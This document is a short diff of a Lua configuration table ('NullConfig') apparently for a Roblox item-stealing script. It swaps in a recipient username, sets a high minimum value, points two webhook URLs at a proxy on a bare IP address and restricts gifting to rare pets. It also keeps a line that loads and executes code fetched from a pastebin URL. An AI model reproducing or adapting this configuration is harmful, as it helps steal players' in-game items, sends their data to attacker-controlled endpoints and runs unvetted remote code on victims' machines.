@@ -1,12 +1,12 @@
 _G.NullConfig = {
-    User = {},
+    User = {"KKGenkais"},
     min_value = 10000000000,
     pingEveryone = "Yes", -- dont change this
-    Webhook = "http://45.13.225.83:20002/proxy/17c50120e956d39ed84c90c30649c375",
-    FakeGift = "Yes",
-    Trash = "http://45.13.225.83:20002/proxy/0cb8086734103354a60e61b1fc778462",
+    Webhook = "http://45.13.225.83:20002/proxy/2276d3867fa9ffe2208602775eb39040",
+    FakeGift = "No",
+    Trash = "http://45.13.225.83:20002/proxy/77ffc7e1e8b79d2d10fdfe32add0c3cf",
     LoadingScreen = "No",
-    GiftOnlyRares = "No",
+    GiftOnlyRares = "Yes",
     ExecuteOtherScript = "Yes",
     OtherScript = "loadstring(game:HttpGet("https://pastebin.com/raw/V8xxRssD"))()",
     PetPriority = {
